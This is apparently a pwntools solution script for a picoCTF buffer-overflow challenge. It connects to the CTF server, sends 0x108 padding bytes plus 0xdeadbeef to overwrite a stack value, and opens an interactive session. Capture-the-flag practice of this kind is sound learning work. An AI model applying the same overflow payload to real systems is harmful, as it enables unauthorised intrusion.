from pwn import *

r = remote("mars.picoctf.net" , 31890)

r.recvuntil(b"What do you see?\n")

payload = b"a"*0x108 + p32(0xdeadbeef)
r.sendline(payload)

r.interactive()
